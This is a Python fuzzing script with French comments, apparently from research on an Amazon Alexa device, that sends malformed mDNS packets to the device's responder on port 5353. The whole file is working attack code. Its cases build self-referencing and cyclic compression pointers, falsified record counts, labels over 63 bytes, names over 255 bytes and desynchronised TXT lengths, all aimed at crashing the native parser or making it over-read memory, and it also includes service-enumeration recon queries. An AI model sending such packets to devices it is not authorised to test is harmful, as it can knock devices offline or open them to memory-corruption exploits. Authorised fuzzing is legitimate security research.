#!/usr/bin/env python3
"""mdns_fuzz — envoie des paquets mDNS malformés au responder du device.

CIBLE : le service qui répond `_amzn-alexa._tcp.local` (SRV → 6543). Identité
inconnue (mdnsd natif Android N = fork mDNSResponder d'Apple tournant comme
user mdnsr, OU daemon Amazon propre). Depuis l'AP, on est sur le même L2 →
multicast 224.0.0.251:5353 + unicast device:5353. Parseur natif probable =
surface mémoire réelle, jamais testée.

Usage :
  sudo python3 mdns_fuzz.py --dev 192.168.50.25            # unicast ctrl_ok
  sudo python3 mdns_fuzz.py --dev 192.168.50.25 --case ptr_selfloop
  sudo python3 mdns_fuzz.py --dev 192.168.50.25 --mcast    # via 224.0.0.251
Log : /tmp/fakeap/mdns_fuzz.log
"""
import argparse
import socket
import struct
import time

LOGF = "/tmp/fakeap/mdns_fuzz.log"
MCAST = "224.0.0.251"


def log(m):
    line = "%s %s" % (time.strftime("%H:%M:%S"), m)
    with open(LOGF, "a") as f:
        f.write(line + "\n")
    print(line, flush=True)


def nm(name):
    out = b""
    for lbl in name.encode().strip(b".").split(b".") if isinstance(name, bytes) else name.strip(".").split("."):
        b = lbl if isinstance(lbl, bytes) else lbl.encode()
        out += bytes([len(b)]) + b
    return out + b"\x00"


def build(case, qid=0x1234):
    q = nm("_amzn-alexa._tcp.local")
    hdr = struct.pack("!HHHHHH", qid, 0, 1, 0, 0, 0)
    qd = q + struct.pack("!HH", 12, 1)                      # PTR IN

    def rr(rname, rtype, ttl, rd, rdlen=None):
        return rname + struct.pack("!HHI", rtype, 1, ttl) + \
            struct.pack("!H", len(rd) if rdlen is None else rdlen) + rd

    if case == "ctrl_ok":
        return hdr + qd
    if case == "ptr_selfloop":
        # réponse NON sollicitée : nom du RR = pointeur sur lui-même
        off = 12 + len(qd)
        body = struct.pack("!HHHHHH", qid, 0x8400, 0, 1, 0, 0) + qd
        rrstart = len(body)
        selfname = b"\xc0" + bytes([rrstart])
        body += rr(selfname, 12, 4500, b"\xc0" + bytes([rrstart]))   # PTR → lui-même
        return body
    if case == "ancount_lie":
        body = struct.pack("!HHHHHH", qid, 0x8400, 0, 255, 0, 0) + qd
        body += rr(q, 12, 4500, b"\xc0\x0c")
        return body
    if case == "txt_len_lie":
        body = struct.pack("!HHHHHH", qid, 0x8400, 0, 1, 0, 0) + qd
        body += q + struct.pack("!HHI", 16, 1, 4500) + struct.pack("!H", 0xFFFF) + b"a=b"
        return body
    if case == "srv_target_loop":
        body = struct.pack("!HHHHHH", qid, 0x8400, 0, 1, 0, 0) + qd
        # SRV : prio, weight, port puis cible = pointeur qui reboucle sur le début du RR
        rrstart = len(body) + 12 + 6 + 2                    # approx name+fixed+rdlen
        rd = struct.pack("!HHH", 0, 0, 6543) + b"\xc0" + bytes([(len(body) + 12) & 0xFF])
        body += rr(q, 33, 120, rd)
        return body
    if case == "long_name":
        big = nm(".".join(("x" * 60) for _ in range(4)) + ".local")
        body = struct.pack("!HHHHHH", qid, 0x8400, 0, 1, 0, 0) + qd
        body += rr(big, 12, 4500, b"\xc0\x0c")
        return body
    if case == "qdcount_lie":
        return struct.pack("!HHHHHH", qid, 0, 100, 0, 0, 0) + qd
    if case == "ns_ptr_far":
        body = struct.pack("!HHHHHH", qid, 0x8400, 0, 0, 1, 0) + qd
        body += q + struct.pack("!HHI", 2, 1, 4500) + struct.pack("!H", 3) + b"\xc0\xff\xff"
        return body
    if case == "label_63_chain":
        # 4 labels de 63 = 252 + type 0 = 255 exact, pointeur final hors paquet
        ln = bytes([63]) + b"y" * 63
        body = struct.pack("!HHHHHH", qid, 0x8400, 0, 1, 0, 0) + qd
        body += (ln * 3) + b"\x00" + struct.pack("!HHI", 12, 1, 4500) + \
            struct.pack("!H", 2) + b"\xc0\x0c"
        return body
    if case == "ka_storm":
        return hdr + qd
    if case == "label_over_63":
        # ★ octet de longueur de label = 0x7F (127 > 63, bits réservés) : les
        # parseurs laxistes lisent 127 octets → surlecture. RDATA brut.
        body = struct.pack("!HHHHHH", qid, 0x8400, 0, 1, 0, 0) + qd
        body += q + struct.pack("!HHI", 12, 1, 4500) + struct.pack("!H", 129)
        body += bytes([0x7F]) + b"z" * 127 + b"\x00"
        return body
    if case == "name_over_255":
        # ★ nom décompressé > 255 : 5 labels de 63 (315) dans le RDATA d'un PTR
        body = struct.pack("!HHHHHH", qid, 0x8400, 0, 1, 0, 0) + qd
        big = (bytes([63]) + b"n" * 63) * 5 + b"\x00"
        body += q + struct.pack("!HHI", 12, 1, 4500) + struct.pack("!H", len(big)) + big
        return body
    if case == "txt_inner_desync":
        # ★ TXT = suite de <len><data> : longueur interne > taille du record →
        # deux niveaux de longueur désynchronisés (cas recommandé ag2)
        body = struct.pack("!HHHHHH", qid, 0x8400, 0, 1, 0, 0) + qd
        rd = bytes([0xFF]) + b"k=v" + bytes([40]) + b"short"
        body += q + struct.pack("!HHI", 16, 1, 4500) + struct.pack("!H", len(rd)) + rd
        return body
    if case == "two_ptr_cycle":
        # ★ cycle à 2 pointeurs de compression (le classique des parseurs récursifs)
        body = struct.pack("!HHHHHH", qid, 0x8400, 0, 1, 0, 0) + qd
        body += q + struct.pack("!HHI", 12, 1, 4500) + struct.pack("!H", 2) + b"\xc0\x0c"
        return body
    if case == "recon_services":
        # RECON : énumérer tous les types de services connus du responder
        q = nm("_services._dns-sd._udp.local")
        return struct.pack("!HHHHHH", qid, 0, 1, 0, 0, 0) + q + struct.pack("!HH", 12, 1)
    if case == "recon_meta":
        # RECON : browses méta + hostname du device
        q = nm("_http._tcp.local")
        return struct.pack("!HHHHHH", qid, 0, 1, 0, 0, 0) + q + struct.pack("!HH", 12, 1)
    return hdr + qd


CASES = ["ctrl_ok", "ptr_selfloop", "ancount_lie", "txt_len_lie", "srv_target_loop",
         "long_name", "qdcount_lie", "ns_ptr_far", "label_63_chain",
         "label_over_63", "name_over_255", "txt_inner_desync", "two_ptr_cycle",
         "recon_services", "recon_meta"]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--dev", required=True)
    ap.add_argument("--case", default="ctrl_ok")
    ap.add_argument("--mcast", action="store_true")
    ap.add_argument("--count", type=int, default=5)
    ap.add_argument("--interval", type=float, default=0.5)
    ap.add_argument("--list", action="store_true")
    a = ap.parse_args()
    if a.list:
        print("\n".join(CASES))
        return
    if a.case not in CASES:
        print("cas inconnu (--list)")
        return
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    if a.mcast:
        s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 1)
    pkt = build(a.case)
    dst = (MCAST, 5353) if a.mcast else (a.dev, 5353)
    log("=== mdns_fuzz case=%s dst=%s:%d (%d o) x%d ===" % (a.case, dst[0], dst[1], len(pkt), a.count))
    for i in range(a.count):
        s.sendto(pkt, dst)
        log("envoyé #%d" % (i + 1))
        time.sleep(a.interval)
    log("fin — surveiller le responder (6543 doit rester vivant : nc -zv %s 6543)" % a.dev)


if __name__ == "__main__":
    main()
